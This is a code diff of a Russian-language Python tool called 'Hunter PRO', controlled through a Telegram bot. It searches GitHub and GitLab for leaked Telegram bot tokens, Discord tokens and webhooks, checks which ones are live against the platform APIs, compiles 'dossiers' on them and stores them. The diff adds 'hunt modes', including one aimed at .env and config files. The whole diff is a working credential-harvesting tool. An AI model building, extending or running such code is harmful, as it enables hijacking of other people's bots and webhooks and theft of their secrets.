@@ -50,7 +50,7 @@ SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
 LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
 MAX_WORKERS = int(os.getenv("MAX_WORKERS", "6"))
 MAX_LOG_LINES = 15
-REQUEST_TIMEOUT: Tuple[float, float] = (3.0, 5.0)
+CHECK_HARD_TIMEOUT = 7.0
 
 if not CONTROL_BOT_TOKEN:
     raise RuntimeError("Не задана переменная окружения CONTROL_BOT_TOKEN!")
@@ -58,18 +58,18 @@ if not CONTROL_BOT_TOKEN:
 bot = telebot.TeleBot(CONTROL_BOT_TOKEN, threaded=True, num_threads=6)
 app = Flask(__name__)
 
-# Потокобезопасная HTTP-сессия с увеличенным пулом соединений
+# Пул соединений для поиска в GitHub/GitLab и общих HTTP-запросов
 http_session = requests.Session()
 _adapter = HTTPAdapter(pool_connections=32, pool_maxsize=32, max_retries=1)
 http_session.mount("https://", _adapter)
 http_session.mount("http://", _adapter)
 http_session.headers.update({
-    "User-Agent": "HunterPRO-Scanner/7.1 (+https://github.com)"
+    "User-Agent": "HunterPRO-Scanner/7.3 (+https://github.com)"
 })
 
 
 # =====================================================================
-# РЕГУЛЯРНЫЕ ВЫРАЖЕНИЯ И СЛОВАРИ
+# РЕГУЛЯРНЫЕ ВЫРАЖЕНИЯ, РЕЖИМЫ ОХОТЫ И СЛОВАРИ
 # =====================================================================
 TG_TOKEN_RE = re.compile(
     r"\b\d{8,10}:AA[A-Za-z0-9_-]{32}\b|\b\d{8,10}:[A-Za-z0-9_-]{35}\b"
@@ -81,11 +81,33 @@ DISCORD_WEBHOOK_RE = re.compile(
     r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
 )
 
-BASE_DORKS = [
+ALL_DORKS = [
     "BOT_TOKEN",
     "TELEGRAM_BOT_TOKEN",
     "bot_token",
     "api.telegram.org/bot",
+    "DISCORD_TOKEN",
+    "discord.com/api/webhooks",
+]
+
+TG_DORKS = [
+    "BOT_TOKEN",
+    "TELEGRAM_BOT_TOKEN",
+    "bot_token",
+    "api.telegram.org/bot",
+    "TELEBOT_TOKEN",
+]
+
+DC_DORKS = [
+    "DISCORD_TOKEN",
+    "discord.com/api/webhooks",
+    "DISCORD_BOT_TOKEN",
+    "webhook_url",
+]
+
+CONFIG_DORKS = [
+    "BOT_TOKEN",
+    "TELEGRAM_BOT_TOKEN",
     "DISCORD_TOKEN",
     "discord.com/api/webhooks",
 ]
@@ -101,12 +123,27 @@ TARGET_FILENAMES = [
     "filename:.js",
 ]
 
+CONFIG_FILENAMES = [
+    "filename:.env",
+    "filename:config.py",
+    "filename:settings.py",
+    "filename:config.json",
+    "filename:.env.example",
+]
+
+HUNT_MODES = {
+    "all": "Всё подряд",
+    "tg": "Только Telegram",
+    "dc": "Только Discord / Webhooks",
+    "env": "Фокус на .env / config",
+}
+
 HACKER_PHRASES = [
     "Сканирую GitHub и GitLab...",
     "Проверяю окна лимитов API...",
     "Анализирую фрагменты кода...",
     "Сверяю найденные ключи с базой...",
-    "Проверяю активность ботов и вебхуков...",
+    "Проверяю webhook и активность ботов...",
     "Собираю досье по найденным целям...",
     "Фильтрую шаблоны и примеры...",
     "Обновляю телеметрию поиска...",
@@ -140,6 +177,7 @@ search_state: Dict[str, Any] = {
     "stop_requested": False,
     "limit_live": 5,
     "filter_mode": "all",
+    "hunt_mode": "all",
     "found_live_current": 0,
     "skipped_by_filter": 0,
     "checked_tokens": 0,
@@ -216,6 +254,7 @@ def get_state_snapshot() -> Dict[str, Any]:
             "stop_requested": search_state["stop_requested"],
             "limit_live": search_state["limit_live"],
             "filter_mode": search_state["filter_mode"],
+            "hunt_mode": search_state["hunt_mode"],
             "found_live_current": search_state["found_live_current"],
             "skipped_by_filter": search_state["skipped_by_filter"],
             "checked_tokens": search_state["checked_tokens"],
@@ -474,102 +513,157 @@ def save_live_token(token_data: Dict[str, Any]) -> bool:
 
 
 # =====================================================================
-# ПРОВЕРКА ТОКЕНОВ, ВЕБХУКОВ И РУЧНАЯ ПРОВЕРКА (С ЖЁСТКИМИ ТАЙМАУТАМИ)
+# ПРОВЕРКА ТОКЕНОВ, ВЕБХУКОВ, ДОСЬЕ (С getWebhookInfo) И ЖЁСТКИМИ ТАЙМАУТАМИ
 # =====================================================================
-def get_telegram_bot_dossier(token: str) -> str:
-    try:
-        desc_resp = http_session.get(
-            f"https://api.telegram.org/bot{token}/getMyDescription",
-            timeout=REQUEST_TIMEOUT,
-        )
-        desc_data = desc_resp.json() if desc_resp.ok else {}
-        raw_desc = desc_data.get("result", {}).get("description") or "Нет описания"
-        safe_desc = html.escape(str(raw_desc).strip()[:300])
-
-        cmd_resp = http_session.get(
-            f"https://api.telegram.org/bot{token}/getMyCommands",
-            timeout=REQUEST_TIMEOUT,
-        )
-        cmd_data = cmd_resp.json() if cmd_resp.ok else {}
-        raw_cmds = cmd_data.get("result") or []
-        if isinstance(raw_cmds, list) and raw_cmds:
-            cmds_formatted = ", ".join(
-                html.escape(f"/{c.get('command', '')}")
-                for c in raw_cmds[:15]
-                if isinstance(c, dict) and c.get("command")
-            ) or "Нет команд"
-        else:
-            cmds_formatted = "Нет команд"
-
-        return f"📝 <b>Био:</b> {safe_desc}\n📜 <b>Команды:</b> {cmds_formatted}"
-    except Exception:
-        return "Не удалось загрузить полное досье."
-
-
-def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    url = f"https://api.telegram.org/bot{token}/getMe"
-    try:
-        resp = http_session.get(url, timeout=REQUEST_TIMEOUT)
-        if resp.status_code != 200:
-            return False, None, False, "", f"HTTP {resp.status_code}"
-        payload = resp.json()
-        if payload.get("ok") and isinstance(payload.get("result"), dict):
-            result = payload["result"]
-            username = result.get("username") or result.get("first_name") or "UnknownBot"
-            first_name = str(result.get("first_name", "")).lower()
-            username_lower = str(username).lower()
-
-            is_suspicious = any(
-                word in first_name or word in username_lower
-                for word in SCAM_KEYWORDS
-            )
-            dossier = get_telegram_bot_dossier(token)
-            return True, str(username), is_suspicious, dossier, None
-        return False, None, False, "", "ok=false"
-    except requests.Timeout:
-        return False, None, False, "", "таймаут"
-    except Exception as exc:
-        return False, None, False, "", str(exc)[:30]
-
-
-def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    url = "https://discord.com/api/v10/users/@me"
-    headers = {"Authorization": f"Bot {token}"}
-    try:
-        resp = http_session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
-        if resp.status_code == 200:
-            data = resp.json()
-            username = data.get("username") or "DiscordBot"
-            discriminator = data.get("discriminator")
-            if discriminator and discriminator != "0":
-                display_name = f"{username}#{discriminator}"
-            else:
-                display_name = str(username)
-
-            lower_name = display_name.lower()
-            is_suspicious = any(word in lower_name for word in SCAM_KEYWORDS)
-            return True, display_name, is_suspicious, "🤖 Discord Bot Token активен", None
+def _inspect_telegram_with_session(
+    sess: requests.Session, token: str
+) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
+    resp = sess.get(f"https://api.telegram.org/bot{token}/getMe", timeout=(2.5, 4.0))
+    if resp.status_code != 200:
         return False, None, False, "", f"HTTP {resp.status_code}"
-    except requests.Timeout:
-        return False, None, False, "", "таймаут"
-    except Exception as exc:
-        return False, None, False, "", str(exc)[:30]
 
+    payload = resp.json()
+    if not (payload.get("ok") and isinstance(payload.get("result"), dict)):
+        return False, None, False, "", "ok=false"
 
-def check_discord_webhook(webhook_url: str) -> Tuple[bool, Optional[str], Optional[str]]:
+    result = payload["result"]
+    username = result.get("username") or result.get("first_name") or "UnknownBot"
+    first_name = str(result.get("first_name", "")).lower()
+    is_scam = any(
+        word in first_name or word in str(username).lower()
+        for word in SCAM_KEYWORDS
+    )
+
+    desc_text = "Нет описания"
+    cmds_text = "Нет команд"
+    wh_text = "Webhook не задан (polling)"
+
     try:
-        resp = http_session.get(webhook_url, timeout=REQUEST_TIMEOUT)
-        if resp.status_code == 200:
-            data = resp.json()
-            name = data.get("name") or "Webhook"
-            channel_id = data.get("channel_id")
-            label = f"{name} (ch:{channel_id})" if channel_id else str(name)
-            return True, label, None
-        return False, None, f"HTTP {resp.status_code}"
+        d_resp = sess.get(
+            f"https://api.telegram.org/bot{token}/getMyDescription",
+            timeout=(2.0, 3.0),
+        )
+        if d_resp.ok:
+            raw_desc = d_resp.json().get("result", {}).get("description")
+            if raw_desc:
+                desc_text = html.escape(str(raw_desc).strip()[:300])
+    except Exception:
+        pass
+
+    try:
+        c_resp = sess.get(
+            f"https://api.telegram.org/bot{token}/getMyCommands",
+            timeout=(2.0, 3.0),
+        )
+        if c_resp.ok:
+            raw_cmds = c_resp.json().get("result") or []
+            if isinstance(raw_cmds, list) and raw_cmds:
+                parsed = [
+                    html.escape(f"/{c.get('command', '')}")
+                    for c in raw_cmds[:15]
+                    if isinstance(c, dict) and c.get("command")
+                ]
+                if parsed:
+                    cmds_text = ", ".join(parsed)
+    except Exception:
+        pass
+
+    try:
+        wh_resp = sess.get(
+            f"https://api.telegram.org/bot{token}/getWebhookInfo",
+            timeout=(2.0, 3.0),
+        )
+        if wh_resp.ok:
+            wh_res = wh_resp.json().get("result") or {}
+            wh_url = str(wh_res.get("url") or "").strip()
+            pending = int(wh_res.get("pending_update_count") or 0)
+            last_err = str(wh_res.get("last_error_message") or "").strip()
+            if wh_url:
+                safe_wh = html.escape(wh_url[:120])
+                wh_text = f"<code>{safe_wh}</code> (очередь: {pending})"
+                if last_err:
+                    wh_text += f"\n⚠️ <b>Ошибка WH:</b> <code>{html.escape(last_err[:120])}</code>"
+            else:
+                wh_text = f"Не задан (очередь: {pending})"
+    except Exception:
+        pass
+
+    dossier = (
+        f"📝 <b>Био:</b> {desc_text}\n"
+        f"📜 <b>Команды:</b> {cmds_text}\n"
+        f"🌐 <b>Webhook:</b> {wh_text}"
+    )
+    return True, str(username), is_scam, dossier, None
+
+
+def _inspect_discord_token_with_session(
+    sess: requests.Session, token: str
+) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
+    headers = {"Authorization": f"Bot {token}"}
+    resp = sess.get(
+        "https://discord.com/api/v10/users/@me",
+        headers=headers,
+        timeout=(2.5, 4.0),
+    )
+    if resp.status_code == 200:
+        data = resp.json()
+        username = data.get("username") or "DiscordBot"
+        discriminator = data.get("discriminator")
+        if discriminator and discriminator != "0":
+            display_name = f"{username}#{discriminator}"
+        else:
+            display_name = str(username)
+
+        is_scam = any(word in display_name.lower() for word in SCAM_KEYWORDS)
+        return True, display_name, is_scam, "🤖 Discord Bot Token активен", None
+    return False, None, False, "", f"HTTP {resp.status_code}"
+
+
+def _inspect_discord_webhook_with_session(
+    sess: requests.Session, webhook_url: str
+) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
+    resp = sess.get(webhook_url, timeout=(2.5, 4.0))
+    if resp.status_code == 200:
+        data = resp.json()
+        name = data.get("name") or "Webhook"
+        channel_id = data.get("channel_id")
+        guild_id = data.get("guild_id")
+        parts = [str(name)]
+        if guild_id:
+            parts.append(f"srv:{guild_id}")
+        if channel_id:
+            parts.append(f"ch:{channel_id}")
+        label = " / ".join(parts)
+        return True, label, True, "🪝 Активный Discord Webhook", None
+    return False, None, False, "", f"HTTP {resp.status_code}"
+
+
+def check_finding_hard_timeout(
+    f_type: str, target: str
+) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
+    def _worker_call() -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
+        with requests.Session() as fresh_sess:
+            fresh_sess.headers.update({"User-Agent": "HunterPRO-Checker/7.3"})
+            if f_type == "Telegram":
+                return _inspect_telegram_with_session(fresh_sess, target)
+            if f_type == "Discord":
+                return _inspect_discord_token_with_session(fresh_sess, target)
+            if f_type == "Webhook":
+                return _inspect_discord_webhook_with_session(fresh_sess, target)
+            return False, None, False, "", "unknown type"
+
+    ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+    try:
+        fut = ex.submit(_worker_call)
+        return fut.result(timeout=CHECK_HARD_TIMEOUT)
+    except concurrent.futures.TimeoutError:
+        return False, None, False, "", f"таймаут {int(CHECK_HARD_TIMEOUT)}с"
     except requests.Timeout:
-        return False, None, "таймаут"
+        return False, None, False, "", "сетевой таймаут"
     except Exception as exc:
-        return False, None, str(exc)[:30]
+        return False, None, False, "", str(exc)[:32]
+    finally:
+        ex.shutdown(wait=False)
 
 
 def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
@@ -582,17 +676,12 @@ def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
     if wh_match:
         target = wh_match.group(0).strip()
         f_type = "Webhook"
-        is_live, label, err_reason = check_discord_webhook(target)
-        is_scam = True
-        dossier = "🪝 Discord Webhook (потенциально опасный / используется для слива логов)"
     elif tg_match:
         target = tg_match.group(0).strip()
         f_type = "Telegram"
-        is_live, label, is_scam, dossier, err_reason = check_telegram_token(target)
     elif dc_match:
         target = dc_match.group(0).strip()
         f_type = "Discord"
-        is_live, label, is_scam, dossier, err_reason = check_discord_token(target)
     else:
         return (
             "⚠️ <b>Не удалось распознать ключ или webhook.</b>\n"
@@ -600,6 +689,8 @@ def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
             "Discord Bot Token или ссылку <code>https://discord.com/api/webhooks/...</code>.",
             None,
         )
+
+    is_live, label, is_scam, dossier, err_reason = check_finding_hard_timeout(f_type, target)
 
     safe_type = html.escape(f_type)
     safe_target = html.escape(target)
@@ -635,11 +726,20 @@ def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
     return report, token_info
 
 
+def _allowed_by_hunt_mode(platform: str, hunt_mode: str) -> bool:
+    if hunt_mode == "tg":
+        return platform == "Telegram"
+    if hunt_mode == "dc":
+        return platform in ("Discord", "Webhook")
+    return True
+
+
 def extract_findings_from_text(
     text: str,
     repo_full_name: str,
     html_url: str,
     seen_tokens: set,
+    hunt_mode: str = "all",
 ) -> List[Dict[str, str]]:
     if not text:
         return []
@@ -654,6 +754,8 @@ def extract_findings_from_text(
     ]
 
     for platform, regex in patterns:
+        if not _allowed_by_hunt_mode(platform, hunt_mode):
+            continue
         for match in regex.findall(text):
             candidate = match.strip()
             if not candidate:
@@ -672,7 +774,7 @@ def extract_findings_from_text(
 
 
 # =====================================================================
-# ПОИСК: GITHUB И GITLAB
+# ПОИСК: GITHUB И GITLAB (С УЧЁТОМ РЕЖИМА ОХОТЫ)
 # =====================================================================
 def _sleep_respecting_stop(seconds: float) -> None:
     deadline = time.time() + max(0.0, seconds)
@@ -681,6 +783,32 @@ def _sleep_respecting_stop(seconds: float) -> None:
             if search_state["stop_requested"]:
                 break
         time.sleep(0.5)
+
+
+def _build_search_query(hunt_mode: str) -> str:
+    if hunt_mode == "tg":
+        base = random.choice(TG_DORKS)
+        lang = random.choice(["python", "javascript", "php", "go", "json", ""])
+        file_filter = random.choice(TARGET_FILENAMES)
+    elif hunt_mode == "dc":
+        base = random.choice(DC_DORKS)
+        lang = random.choice(["javascript", "typescript", "python", "json", ""])
+        file_filter = random.choice(TARGET_FILENAMES)
+    elif hunt_mode == "env":
+        base = random.choice(CONFIG_DORKS)
+        lang = ""
+        file_filter = random.choice(CONFIG_FILENAMES)
+    else:
+        base = random.choice(ALL_DORKS)
+        lang = random.choice(["python", "javascript", "typescript", "php", "go", "json", ""])
+        file_filter = random.choice(TARGET_FILENAMES)
+
+    parts = [base, NOISE_FILTERS, "in:file"]
+    if lang:
+        parts.append(f"language:{lang}")
+    if file_filter:
+        parts.append(file_filter)
+    return " ".join(parts)
 
 
 def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
@@ -693,21 +821,14 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
         _sleep_respecting_stop(6)
         return [], 401
 
+    with state_lock:
+        hunt_mode = search_state["hunt_mode"]
+
     findings: List[Dict[str, str]] = []
     seen_tokens = load_seen_tokens()
 
-    base = random.choice(BASE_DORKS)
-    lang = random.choice(["python", "javascript", "typescript", "php", "go", "json", ""])
-    file_filter = random.choice(TARGET_FILENAMES)
-
-    parts = [base, NOISE_FILTERS, "in:file"]
-    if lang:
-        parts.append(f"language:{lang}")
-    if file_filter:
-        parts.append(file_filter)
-
-    query = " ".join(parts)
-    set_status(search_state["status_text"], f"GitHub: {query}")
+    query = _build_search_query(hunt_mode)
+    set_status(search_state["status_text"], f"GitHub [{HUNT_MODES.get(hunt_mode, hunt_mode)}]: {query}")
 
     headers = {
         "Accept": "application/vnd.github.text-match+json",
@@ -727,7 +848,7 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
             "https://api.github.com/search/code",
             headers=headers,
             params=params,
-            timeout=(4.0, 12.0),
+            timeout=(4.0, 10.0),
         )
 
         if resp.status_code == 401:
@@ -766,7 +887,9 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
                     fragments.append(frag)
 
             combined = "\n".join(fragments)
-            extracted = extract_findings_from_text(combined, repo_name, html_url, seen_tokens)
+            extracted = extract_findings_from_text(
+                combined, repo_name, html_url, seen_tokens, hunt_mode=hunt_mode
+            )
             for item_found in extracted:
                 append_seen_token(item_found["token"])
                 seen_tokens.add(item_found["token"])
@@ -790,9 +913,18 @@ def search_gitlab() -> List[Dict[str, str]]:
     if not GITLAB_TOKEN:
         return []
 
+    with state_lock:
+        hunt_mode = search_state["hunt_mode"]
+
+    if hunt_mode == "tg":
+        query = random.choice(["BOT_TOKEN", "TELEGRAM_BOT_TOKEN", "api.telegram.org/bot"])
+    elif hunt_mode == "dc":
+        query = random.choice(["DISCORD_TOKEN", "discord.com/api/webhooks"])
+    else:
+        query = random.choice(["BOT_TOKEN", "api.telegram.org/bot", "discord.com/api/webhooks"])
+
     findings: List[Dict[str, str]] = []
     seen_tokens = load_seen_tokens()
-    query = random.choice(["BOT_TOKEN", "api.telegram.org/bot", "discord.com/api/webhooks"])
     set_status(search_state["status_text"], f"GitLab: {query}")
 
     headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
@@ -803,7 +935,7 @@ def search_gitlab() -> List[Dict[str, str]]:
             "https://gitlab.com/api/v4/search",
             headers=headers,
             params=params,
-            timeout=(4.0, 12.0),
+            timeout=(4.0, 10.0),
         )
         if resp.status_code == 401:
             notify_critical_error(
@@ -842,7 +974,7 @@ def search_gitlab() -> List[Dict[str, str]]:
                     raw_url,
                     headers=headers,
                     params={"ref": ref},
-                    timeout=REQUEST_TIMEOUT,
+                    timeout=(3.0, 5.0),
                 )
                 if raw_resp.status_code != 200:
                     continue
@@ -854,6 +986,7 @@ def search_gitlab() -> List[Dict[str, str]]:
                     f"gitlab/{project_id}",
                     web_url,
                     seen_tokens,
+                    hunt_mode=hunt_mode,
                 )
                 for item_found in extracted:
                     append_seen_token(item_found["token"])
@@ -1005,6 +1138,7 @@ HTML_TEMPLATE = """
                     document.getElementById('checked').innerText = data.checked;
                     document.getElementById('found').innerText = data.found + ' / ' + data.limit_label;
                     document.getElementById('db_total').innerText = data.db_total;
+                    document.getElementById('hunt_mode').innerText = data.hunt_label;
                     document.getElementById('filter_mode').innerText = data.filter_label;
                     document.getElementById('query').innerText = data.query;
                     document.getElementById('status').innerText = data.status;
@@ -1060,6 +1194,10 @@ HTML_TEMPLATE = """
                     <div class="value" id="db_total">0</div>
                 </div>
                 <div class="stat-box">
+                    <div class="label">Режим охоты</div>
+                    <div class="value" id="hunt_mode">Всё подряд</div>
+                </div>
+                <div class="stat-box">
                     <div class="label">Фильтр сессии</div>
                     <div class="value" id="filter_mode">Все живые</div>
                 </div>
@@ -1101,6 +1239,7 @@ def api_stats():
     limit_val = snap["limit_live"]
     limit_label = "∞" if limit_val >= 999 else str(limit_val)
     filter_label = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
+    hunt_label = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     return jsonify({
         "time": snap["time"],
@@ -1108,6 +1247,8 @@ def api_stats():
         "found": snap["found_live_current"],
         "limit": limit_val,
         "limit_label": limit_label,
+        "hunt_mode": snap["hunt_mode"],
+        "hunt_label": hunt_label,
         "filter_mode": snap["filter_mode"],
         "filter_label": filter_label,
         "db_total": len(live_all),
@@ -1128,13 +1269,14 @@ def api_stop():
 
 
 # =====================================================================
-# ТЕЛЕГРАМ-БОТ: ИНТЕРФЕЙС, РУЧНАЯ ПРОВЕРКА, ФИЛЬТРЫ И ЭКСПОРТ
+# ТЕЛЕГРАМ-БОТ: ИНТЕРФЕЙС, ОХОТА, РУЧНАЯ ПРОВЕРКА, ФИЛЬТРЫ И ЭКСПОРТ
 # =====================================================================
 def get_main_menu() -> types.ReplyKeyboardMarkup:
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.add(
         "🚀 Начать поиск",
         "🛑 Остановить",
+        "🎯 Охота",
         "🧪 Проверка токена",
         "🎛 Фильтр сессии",
         "⚙️ Настройки",
@@ -1148,11 +1290,39 @@ def get_progress_buttons() -> types.InlineKeyboardMarkup:
     markup.add(
         types.InlineKeyboardButton("📊 График", callback_data="show_chart"),
         types.InlineKeyboardButton("🏆 Топ-5", callback_data="show_top5"),
+        types.InlineKeyboardButton("🎯 Охота", callback_data="quick_hunt"),
         types.InlineKeyboardButton("🎛 Фильтр", callback_data="quick_filter"),
         types.InlineKeyboardButton("🔄 Обновить", callback_data="force_update"),
         types.InlineKeyboardButton("🛑 Стоп", callback_data="stop_search_btn"),
     )
     return markup
+
+
+def get_hunt_keyboard() -> types.InlineKeyboardMarkup:
+    snap = get_state_snapshot()
+    cur = snap["hunt_mode"]
+
+    def mark(mode_key: str, title: str) -> str:
+        return f"✅ {title}" if cur == mode_key else title
+
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton(mark("all", "Всё подряд (TG + DC + Webhooks)"), callback_data="sethunt_all"),
+        types.InlineKeyboardButton(mark("tg", "Только Telegram-боты"), callback_data="sethunt_tg"),
+        types.InlineKeyboardButton(mark("dc", "Только Discord-боты и Webhooks"), callback_data="sethunt_dc"),
+        types.InlineKeyboardButton(mark("env", "Фокус на .env и конфиги"), callback_data="sethunt_env"),
+    )
+    return markup
+
+
+def _build_hunt_menu_text() -> str:
+    snap = get_state_snapshot()
+    cur_label = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
+    return (
+        f"🎯 <b>Режим охоты</b>\n\n"
+        f"Текущая цель: <code>{html.escape(cur_label)}</code>\n\n"
+        f"<i>Определяет, какие поисковые запросы и фильтры файлов отправлять в GitHub и GitLab. Можно менять даже на лету.</i>"
+    )
 
 
 def get_filter_keyboard() -> types.InlineKeyboardMarkup:
@@ -1192,15 +1362,18 @@ def send_welcome(message: types.Message):
     sheets_status = "подключён" if sheets_ok else "не настроен"
     snap = get_state_snapshot()
     cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
+    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     welcome_text = (
         "👋 <b>Пульт Hunter PRO</b>\n"
-        "Многопоточный сканер токенов и вебхуков с ручной проверкой, фильтрами, графиками и экспортом.\n\n"
+        "Многопоточный сканер токенов и вебхуков с ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
         f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
+        f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
         f"🎛 Фильтр сессии: <code>{html.escape(cur_filter)}</code>\n"
         f"🗂 Записей в базе: <code>{len(load_live_tokens())}</code>\n\n"
         "<b>Команды:</b>\n"
         "/check &lt;токен или webhook&gt; — ручная проверка\n"
+        "/hunt — выбрать режим охоты\n"
         "/filter — переключить фильтр сессии\n"
         "/status — быстрый статус"
     )
@@ -1220,6 +1393,7 @@ def cmd_status(message: types.Message):
 
     snap = get_state_snapshot()
     cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
+    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
     limit_str = "∞" if snap["limit_live"] >= 999 else str(snap["limit_live"])
     running_str = "Активен" if snap["is_searching"] else "Остановлен"
 
@@ -1227,6 +1401,7 @@ def cmd_status(message: types.Message):
         f"📡 <b>Статус Hunter PRO</b>\n\n"
         f"• Состояние: <code>{html.escape(running_str)}</code>\n"
         f"• Статус задачи: <code>{html.escape(snap['status_text'])}</code>\n"
+        f"• Охота: <code>{html.escape(cur_hunt)}</code>\n"
         f"• Время: <code>{html.escape(snap['time'])}</code>\n"
         f"• Проверено: <code>{snap['checked_tokens']}</code>\n"
         f"• Живых за сессию: <code>{snap['found_live_current']} / {limit_str}</code>\n"
@@ -1235,6 +1410,72 @@ def cmd_status(message: types.Message):
         f"• Записей в базе: <code>{len(load_live_tokens())}</code>"
     )
     bot.send_message(message.chat.id, text, parse_mode="HTML")
+
+
+@bot.message_handler(commands=["hunt"])
+@bot.message_handler(func=lambda m: m.text == "🎯 Охота")
+def show_hunt_menu(message: types.Message):
+    user_id = message.from_user.id if message.from_user else None
+    if not is_admin(message.chat.id, user_id):
+        return
+
+    bot.send_message(
+        message.chat.id,
+        _build_hunt_menu_text(),
+        reply_markup=get_hunt_keyboard(),
+        parse_mode="HTML",
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "quick_hunt")
+def cb_quick_hunt(call: types.CallbackQuery):
+    chat_id = call.message.chat.id if call.message else None
+    user_id = call.from_user.id if call.from_user else None
+    if not is_admin(chat_id, user_id):
+        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
+        return
+
+    bot.answer_callback_query(call.id)
+    if chat_id:
+        bot.send_message(
+            chat_id,
+            _build_hunt_menu_text(),
+            reply_markup=get_hunt_keyboard(),
+            parse_mode="HTML",
+        )
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("sethunt_"))
+def cb_set_hunt(call: types.CallbackQuery):
+    chat_id = call.message.chat.id if call.message else None
+    user_id = call.from_user.id if call.from_user else None
+    if not is_admin(chat_id, user_id):
+        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
+        return
+
+    mode_key = call.data.split("_", 1)[1]
+    if mode_key not in HUNT_MODES:
+        bot.answer_callback_query(call.id, "Неизвестный режим охоты")
+        return
+
+    with state_lock:
+        search_state["hunt_mode"] = mode_key
+
+    label = HUNT_MODES[mode_key]
+    add_log(f"🎯 Выбран режим охоты: {label}")
+    bot.answer_callback_query(call.id, f"Охота: {label}")
+
+    if call.message:
+        try:
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=_build_hunt_menu_text(),
+                reply_markup=get_hunt_keyboard(),
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
 
 
 @bot.message_handler(commands=["filter"])
@@ -1341,7 +1582,7 @@ def btn_manual_check(message: types.Message):
     bot.send_message(
         message.chat.id,
         "🧪 <b>Ручная проверка токена или webhook</b>\n\n"
-        "Скинь сюда ключ или ссылку <code>https://discord.com/api/webhooks/...</code> — проверю статус, скам-признаки и соберу досье.",
+        "Скинь сюда ключ или ссылку <code>https://discord.com/api/webhooks/...</code> — проверю статус, скам-признаки и соберу досье (вкл. webhook TG-бота).",
         parse_mode="HTML",
     )
 
@@ -1429,6 +1670,7 @@ def show_settings(message: types.Message):
     current_limit = snap["limit_live"]
     limit_label = "Без лимита" if current_limit >= 999 else str(current_limit)
     cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
+    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
@@ -1441,6 +1683,7 @@ def show_settings(message: types.Message):
         message.chat.id,
         f"⚙️ <b>Настройки поиска</b>\n\n"
         f"• Лимит живых находок: <code>{html.escape(limit_label)}</code>\n"
+        f"• Режим охоты: <code>{html.escape(cur_hunt)}</code>\n"
         f"• Фильтр сессии: <code>{html.escape(cur_filter)}</code>",
         reply_markup=markup,
         parse_mode="HTML",
@@ -1730,6 +1973,7 @@ def cb_force_update(call: types.CallbackQuery):
     func=lambda m: bool(m.text) and not m.text.startswith("/") and m.text not in {
         "🚀 Начать поиск",
         "🛑 Остановить",
+        "🎯 Охота",
         "🧪 Проверка токена",
         "🎛 Фильтр сессии",
         "⚙️ Настройки",
@@ -1833,6 +2077,7 @@ def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> 
     safe_phrase = html.escape(str(snap["phrase"]))
     safe_status = html.escape(str(snap["status_text"]))
     safe_filter = html.escape(FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"]))
+    safe_hunt = html.escape(HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"]))
 
     limit_str = "∞" if snap["limit_live"] >= 999 else str(snap["limit_live"])
 
@@ -1842,7 +2087,7 @@ def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> 
         f"🔍 Проверено: <code>{snap['checked_tokens']}</code>\n"
         f"🟢 Живых: <code>{snap['found_live_current']} / {limit_str}</code> | "
         f"⚠️ Скам: <code>{snap['scam_tokens']}</code>\n"
-        f"🎛 Фильтр: <code>{safe_filter}</code> (пропущено: <code>{snap['skipped_by_filter']}</code>)\n"
+        f"🎯 Охота: <code>{safe_hunt}</code> | 🎛 Фильтр: <code>{safe_filter}</code> (пропущено: <code>{snap['skipped_by_filter']}</code>)\n"
         f"📌 Статус: <code>{safe_status}</code>\n\n"
         f"📡 Запрос: <code>{safe_query}</code>\n\n"
